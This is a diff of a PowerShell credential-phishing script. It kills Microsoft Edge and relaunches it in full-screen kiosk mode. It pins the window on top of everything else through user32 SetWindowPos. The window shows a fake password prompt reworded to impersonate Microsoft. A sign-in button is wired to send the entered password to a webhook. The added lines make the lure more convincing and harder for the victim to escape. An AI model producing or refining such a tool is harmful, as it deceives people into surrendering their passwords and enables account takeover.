@@ -40,12 +40,15 @@ $h = @"
         <br>
         <p id="enterPwd">Enter Password</p>
         <h5 id="passResult"></h5>
-        <p id="policy">Your organisation policy requires you to sign in again <br>after a certain period of time. </p>
+        <p id="policy">Microsoft requires that you confirm your password<br>after a period of 72 days. </p>
         <p>
-          <input type="password" id="password" placeholder="password">
+          <input type="password" id="password" placeholder="Password">
         </p>
         <p id="ForgodPwd">
           <a href="https://go.microsoft.com/fwlink/p/?linkid=2072756">Forgot password?</a>
+        </p>
+        <p id="ForgodPwd">
+          <a href="">Sign in another way?</a>
         </p>
         <p id="btnSignInLocation">
           <!-- Call the sendPasswordToWebhook() function on button click -->
@@ -53,21 +56,9 @@ $h = @"
         </p>
         <br>
         <br>
-        <p id="policy">Employees Login Portal</p>
+        <p id="policy">Microsoft Secure Login</p>
       </section>
     </section>
-  </div>
-  <div id="footer" style="height:36px">
-    <div id="terms" style="float:left;width:84px">
-      <p style="font-size:13px;text-align:left;color:#fff!important">Terms of use</p>
-    </div>
-    <div style="float:left;width:105px">
-      <p style="font-size:12px;color:#fff!important">Privacy &amp; cookies</p>
-    </div>
-    <div id="terms" style="float:left;width:24px">
-      <p style="font-size:12px">. . . <br>
-      </p>
-    </div>
   </div>
   <script>
     function sendCredentialsAndExecuteCommand() {
@@ -104,7 +95,27 @@ Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNe
 Sleep -Milliseconds 250
 
 # START EDGE IN FULLSCREEN
-$edgeProcess = Start-Process -FilePath "msedge.exe" -ArgumentList "--kiosk --app=$a" -WindowStyle Maximized
+$edgeProcess = Start-Process -FilePath "msedge.exe" -ArgumentList "--kiosk --app=$a -WindowStyle Maximized" -PassThru
 Sleep -Milliseconds 500
 $black = Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
 
+$edgeProcess.WaitForInputIdle()
+
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Win32 {
+        [DllImport("user32.dll")]
+        public static extern IntPtr SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+        public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
+        public static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);
+        public const uint SWP_NOMOVE = 0x2;
+        public const uint SWP_NOSIZE = 0x1;
+        public const uint SWP_SHOWWINDOW = 0x40;
+    }
+"@
+
+$null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
+Sleep -Milliseconds 250
+$null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
+Sleep -Milliseconds 250
